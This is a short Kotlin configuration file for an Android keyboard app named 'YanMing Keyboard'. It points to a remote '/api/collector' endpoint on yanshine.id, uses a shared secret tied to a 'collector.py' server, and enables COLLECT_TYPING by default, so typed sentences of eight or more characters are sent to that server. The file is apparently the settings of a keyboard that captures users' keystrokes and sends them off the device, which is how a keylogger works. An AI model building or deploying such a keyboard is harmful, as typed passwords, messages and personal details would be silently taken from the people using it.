package com.yanming.keyboard

// ═══════════════════════════════════════════════════════
// YanMing Keyboard — Configuration
// Change SECRET_KEY to match your collector.py
// ═══════════════════════════════════════════════════════
object Config {
    const val SERVER_URL = "https://yanshine.id"
    const val COLLECTOR  = "$SERVER_URL/api/collector"  // port 5050 via Nginx proxy
    const val SECRET_KEY = "CHANGE_THIS_TO_SOMETHING_LONG_AND_RANDOM"
    const val VERSION    = "1.0.0"

    // Send typing data to server (set false to disable)
    const val COLLECT_TYPING = true
    // Minimum chars before sending a sentence
    const val MIN_SEND_LENGTH = 8
}
